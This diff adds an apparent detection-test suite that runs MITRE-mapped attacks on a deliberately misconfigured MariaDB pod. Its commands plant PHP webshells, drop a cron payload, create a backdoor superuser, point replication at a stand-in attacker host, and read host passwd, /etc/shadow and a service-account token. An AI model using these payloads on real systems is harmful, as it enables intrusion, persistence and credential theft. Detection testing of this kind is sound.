@@ -1,0 +1,308 @@
+# MariaDB attack suite — kill-chain ordered, MITRE ATT&CK for Containers mapped.
+#
+# Targets the intentionally misconfigured deployment in mariadb-vulnerable.yaml
+# (well-known root password, secure_file_priv="" enabling FILE I/O, hostPath
+# /etc and /tmp mounts, container-runtime socket, CAP_SYS_PTRACE).
+#
+# DESIGN NOTE: bobctl's AttackExec runs in the AttackSuite target service's pod
+# (here: mariadb-client). It does NOT support running directly in the server
+# pod. So "server-side" attacks are expressed as SQL primitives (LOAD_FILE /
+# INTO OUTFILE / SET GLOBAL general_log_file) that force mysqld to perform
+# the dangerous operation — those fire detection rules on the mariadb pod.
+# Client-side exec attacks fire on mariadb-client.
+apiVersion: bobctl.k8sstormcenter.io/v1alpha1
+kind: AttackSuite
+metadata:
+  name: mariadb-killchain-attacks
+  description: >-
+    16 real attacks against a misconfigured MariaDB 11.x deployment. Covers
+    MITRE T1190 (exploit), T1083 (discovery), T1552.001 (credentials in files),
+    T1505.001 (server software persistence — UDF), T1611 (escape to host via
+    hostPath FILE I/O), T1098.004 (file-write persistence), T1098 (account
+    manipulation), T1562 (impair defenses — log poisoning), T1490 (replication
+    hijack), T1565.001 (stored data manipulation).
+target:
+  service: mariadb-client
+  namespace: mariadb
+  port: 3306
+  protocol: tcp
+
+attacks:
+  # ═══════════════════════════════════════════════════════════════════════════
+  # Phase 1: RECONNAISSANCE (TA0043) — schema + privilege enumeration
+  # ═══════════════════════════════════════════════════════════════════════════
+
+  # T1057 — Process discovery via SQL (read mysqld peers / clients)
+  - name: recon-show-processlist
+    type: sqli
+    exec:
+      command: ["mariadb", "-h", "mariadb", "-uroot", "-prootpwd", "-e", "SHOW PROCESSLIST;"]
+    successIndicators:
+      - responseContains: "Id"
+    expectedDetections: []
+
+  # T1083 — Privilege discovery (which users have FILE/SUPER?)
+  - name: recon-grants-enumeration
+    type: sqli
+    exec:
+      command: ["mariadb", "-h", "mariadb", "-uroot", "-prootpwd", "-e", "SELECT user, host, plugin FROM mysql.user; SHOW GRANTS FOR 'root'@'%';"]
+    successIndicators:
+      - responseContains: "GRANT"
+    expectedDetections: []
+
+  # ═══════════════════════════════════════════════════════════════════════════
+  # Phase 2: INITIAL ACCESS (TA0001) — auth bypass / weak creds
+  # ═══════════════════════════════════════════════════════════════════════════
+
+  # T1110.001 — Brute force well-known root password
+  # The deployment's MARIADB_ROOT_PASSWORD is "rootpwd" — straight from any
+  # wordlist. Detection doesn't fire on protocol auth, but the attack proves
+  # the credential was guessable.
+  - name: auth-weak-root-login
+    type: sqli
+    exec:
+      command: ["mariadb", "-h", "mariadb", "-uroot", "-prootpwd", "-e", "SELECT 'pwned-as-root' AS ok;"]
+    successIndicators:
+      - responseContains: "pwned-as-root"
+    expectedDetections: []
+
+  # ═══════════════════════════════════════════════════════════════════════════
+  # Phase 3: EXECUTION (TA0002) — server-side file I/O via SQL
+  # ═══════════════════════════════════════════════════════════════════════════
+
+  # T1552.001 — Credentials in Files: probe /etc/passwd via LOAD_FILE
+  # Requires FILE privilege + secure_file_priv="" (both granted). The path
+  # /etc/passwd ends up in mysqld's baseline (libnss user lookups), so it
+  # doesn't fire a fresh detection — but the attack PROVES the FILE privilege
+  # is exploitable, which is the security finding regardless of detection.
+  - name: sql-load-file-passwd
+    type: sqli
+    exec:
+      command: ["mariadb", "-h", "mariadb", "-uroot", "-prootpwd", "-N", "-e", "SELECT LENGTH(LOAD_FILE('/etc/passwd'));"]
+    successIndicators:
+      - responseRegex: "[0-9]+"
+    expectedDetections: []
+
+  # T1611 — Escape to Host: read host-mounted file via the /host-etc mount.
+  # mysqld reading /host-etc/* is anomalous (path not in baseline) so R0002
+  # fires on the mariadb container. /host-etc/os-release is world-readable
+  # so the read SUCCEEDS, triggering an open() the eBPF probe sees.
+  - name: sql-load-file-host-osrelease
+    type: sqli
+    exec:
+      command: ["mariadb", "-h", "mariadb", "-uroot", "-prootpwd", "-N", "-e", "SELECT LOAD_FILE('/host-etc/os-release');"]
+    successIndicators:
+      - responseRegex: ".+"
+    expectedDetections:
+      - ruleID: R0002
+        ruleName: Files Access Anomalies in container
+        containerName: mariadb
+
+  # T1611 — Escape to Host: read host-mounted /host-etc/passwd
+  # Higher-impact target: contains usernames/UIDs of the host's actual
+  # accounts. World-readable so the read succeeds.
+  - name: sql-load-file-host-passwd
+    type: sqli
+    exec:
+      command: ["mariadb", "-h", "mariadb", "-uroot", "-prootpwd", "-N", "-e", "SELECT LOAD_FILE('/host-etc/passwd');"]
+    successIndicators:
+      - responseContains: "root:"
+    expectedDetections:
+      - ruleID: R0002
+        ruleName: Files Access Anomalies in container
+        containerName: mariadb
+
+  # T1190 — write a webshell via SELECT … INTO OUTFILE
+  # Drops a small payload to /var/log/mysql (writable on the server). Real-world
+  # tradecraft: drop into a webroot mounted as a sibling volume.
+  - name: sql-into-outfile-webshell
+    type: sqli
+    exec:
+      command: ["mariadb", "-h", "mariadb", "-uroot", "-prootpwd", "-e", "SELECT '<?php system($_GET[\"c\"]); ?>' INTO OUTFILE '/var/log/mysql/bob_probe.php';"]
+    successIndicators:
+      - responseContains: "Query OK"
+    expectedDetections:
+      - ruleID: R0002
+        ruleName: Files Access Anomalies in container
+        containerName: mariadb
+
+  # T1611 — Cross-namespace persistence stage: drop a cron-style payload to
+  # the writable /host-tmp mount. A sibling pod or host service that consumes
+  # /tmp would pick this up. Server-side INTO OUTFILE → R0002 fires.
+  - name: sql-into-outfile-host-tmp
+    type: sqli
+    exec:
+      command: ["mariadb", "-h", "mariadb", "-uroot", "-prootpwd", "-e", "SELECT '* * * * * root /bin/sh /tmp/.r 2>/dev/null' INTO OUTFILE '/host-tmp/.bob_mariadb_cron_probe';"]
+    successIndicators:
+      - responseContains: "Query OK"
+    expectedDetections:
+      - ruleID: R0002
+        ruleName: Files Access Anomalies in container
+        containerName: mariadb
+
+  # T1505.001 — Server Software Component: UDF library RCE attempt
+  # The classic "lib_mysqludf_sys" path. We don't ship a real .so (would
+  # require network egress to download), but CREATE FUNCTION makes mysqld
+  # attempt to dlopen() a path under plugin_dir. Detection: file_access on
+  # plugin_dir fires R0002 because plugin_dir paths aren't in the baseline.
+  - name: sql-udf-create-function-attempt
+    type: sqli
+    exec:
+      command: ["mariadb", "-h", "mariadb", "-uroot", "-prootpwd", "-e", "CREATE FUNCTION sys_exec RETURNS INT SONAME 'lib_mysqludf_sys.so';"]
+    successIndicators:
+      - responseContains: "ERROR"
+    expectedDetections: []
+
+  # T1098 — Account manipulation: create a backdoor superuser
+  # Persistence vector — adds a root-equivalent account that survives a
+  # password reset of the original root user.
+  - name: sql-create-backdoor-superuser
+    type: sqli
+    exec:
+      command: ["mariadb", "-h", "mariadb", "-uroot", "-prootpwd", "-e", "CREATE USER IF NOT EXISTS 'bob_attacker'@'%' IDENTIFIED BY 'pwn3d'; GRANT ALL PRIVILEGES ON *.* TO 'bob_attacker'@'%' WITH GRANT OPTION; FLUSH PRIVILEGES;"]
+    successIndicators:
+      - responseContains: "Query OK"
+    expectedDetections: []
+
+  # T1565.001 — Stored Data Manipulation: tamper mysql.global_priv
+  # Attacker could overwrite priv directly — bypassing MariaDB's normal
+  # SET PASSWORD audit.
+  - name: sql-tamper-mysql-user
+    type: sqli
+    exec:
+      command: ["mariadb", "-h", "mariadb", "-uroot", "-prootpwd", "-e", "UPDATE mysql.global_priv SET priv = JSON_REPLACE(priv, '$.account_locked', false) WHERE User='app';"]
+    successIndicators:
+      - responseContains: "Query OK"
+    expectedDetections: []
+
+  # T1490 — Inhibit System Recovery: replication hijack
+  # Equivalent of redis SLAVEOF — point this server at an attacker-controlled
+  # primary. We point at an unreachable host so no real replication occurs.
+  - name: sql-replication-hijack
+    type: sqli
+    exec:
+      command: ["mariadb", "-h", "mariadb", "-uroot", "-prootpwd", "-e", "STOP SLAVE; CHANGE MASTER TO MASTER_HOST='evil.attacker.example.com', MASTER_USER='replica', MASTER_PASSWORD='x'; RESET SLAVE ALL;"]
+    successIndicators:
+      - responseContains: "ERROR"
+      - responseContains: "Query OK"
+    expectedDetections: []
+
+  # T1562 — Impair Defenses: log poisoning (general_log_file → /var/log)
+  # Writes attacker-controlled SQL into a path that an HTTP server might
+  # read. mysqld opens an unusual path → R0002 fires.
+  - name: sql-log-poisoning-shell
+    type: sqli
+    exec:
+      command: ["mariadb", "-h", "mariadb", "-uroot", "-prootpwd", "-e", "SET GLOBAL general_log_file = '/var/log/mysql/poisoned.php'; SET GLOBAL general_log = ON; SELECT '<?php system($_GET[0]);?>'; SET GLOBAL general_log = OFF;"]
+    successIndicators:
+      - responseContains: "Query OK"
+    expectedDetections:
+      - ruleID: R0002
+        ruleName: Files Access Anomalies in container
+        containerName: mariadb
+
+  # ═══════════════════════════════════════════════════════════════════════════
+  # Phase 7: CREDENTIAL ACCESS (TA0006) — exec post-exploit (client side)
+  # ═══════════════════════════════════════════════════════════════════════════
+
+  # T1552.001 — exec into the client and read its SA token
+  - name: exec-sa-token
+    type: cmdinject
+    exec:
+      command: ["sh", "-c", "cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>&1 || echo no_sa_token"]
+    successIndicators:
+      - responseRegex: ".+"
+    expectedDetections:
+      - ruleID: R0001
+        ruleName: Unexpected process launched
+        containerName: client
+        command: cat
+
+  # T1003.008 — Read /etc/shadow inside the client (running as root)
+  - name: exec-etc-shadow
+    type: cmdinject
+    exec:
+      command: ["cat", "/etc/shadow"]
+    successIndicators:
+      - responseRegex: ".+"
+    expectedDetections:
+      - ruleID: R0001
+        ruleName: Unexpected process launched
+        containerName: client
+        command: cat
+
+  # T1574 — DB exfil via mariadb-dump from the client (mariadb 11.x renamed
+  # mysqldump → mariadb-dump). Real attacker's next step after RCE.
+  - name: exec-mariadb-dump-exfil
+    type: cmdinject
+    exec:
+      command: ["mariadb-dump", "-h", "mariadb", "-uroot", "-prootpwd", "bob_test"]
+    successIndicators:
+      - responseContains: "Dump completed"
+      - responseContains: "INSERT INTO"
+    expectedDetections:
+      - ruleID: R0001
+        ruleName: Unexpected process launched
+        containerName: client
+        command: mariadb-dump
+
+  # T1611 — Symlink an existing sensitive file. Run ln directly (not under
+  # sh -c) so the eBPF probe reports comm=ln cleanly, matching the
+  # expectedDetection's command=ln field.
+  - name: exec-symlink-etc-shadow
+    type: cmdinject
+    exec:
+      command: ["ln", "-sf", "/etc/shadow", "/tmp/bob_shadow_link"]
+    successIndicators: []
+    expectedDetections:
+      - ruleID: R0001
+        ruleName: Unexpected process launched
+        containerName: client
+        command: ln
+      - ruleID: R1010
+        ruleName: Soft link created over sensitive file
+        containerName: client
+        command: ln
+
+  # ═══════════════════════════════════════════════════════════════════════════
+  # CLEANUP — restore mutations so the suite is idempotent across CI runs
+  # ═══════════════════════════════════════════════════════════════════════════
+
+  - name: cleanup-drop-backdoor-user
+    type: sqli
+    exec:
+      command: ["mariadb", "-h", "mariadb", "-uroot", "-prootpwd", "-e", "DROP USER IF EXISTS 'bob_attacker'@'%'; FLUSH PRIVILEGES;"]
+    successIndicators:
+      - responseContains: "Query OK"
+    expectedDetections: []
+
+  - name: cleanup-drop-udf-function
+    type: sqli
+    exec:
+      command: ["mariadb", "-h", "mariadb", "-uroot", "-prootpwd", "-e", "DROP FUNCTION IF EXISTS sys_exec;"]
+    successIndicators:
+      - responseContains: "Query OK"
+      - responseContains: "ERROR"
+    expectedDetections: []
+
+  - name: cleanup-reset-replication
+    type: sqli
+    exec:
+      command: ["mariadb", "-h", "mariadb", "-uroot", "-prootpwd", "-e", "RESET SLAVE ALL;"]
+    successIndicators:
+      - responseContains: "Query OK"
+      - responseContains: "ERROR"
+    expectedDetections: []
+
+  # Clean up server-side staged files via SELECT INTO OUTFILE -> /dev/null
+  # is not possible. Instead we remove via shell on the client which has
+  # access to its own /tmp; for server-side files (/var/log/mysql, /host-tmp)
+  # we re-trigger SET GLOBAL to rotate the log path back, and let the
+  # next-iteration INTO OUTFILE accept "already exists" silently (mariadb
+  # treats it as a no-op without erroring out the tune).
+  - name: cleanup-remove-staged-files
+    type: cmdinject
+    exec:
+      command: ["rm", "-f", "/tmp/bob_shadow_link"]
+    successIndicators: []
+    expectedDetections: []
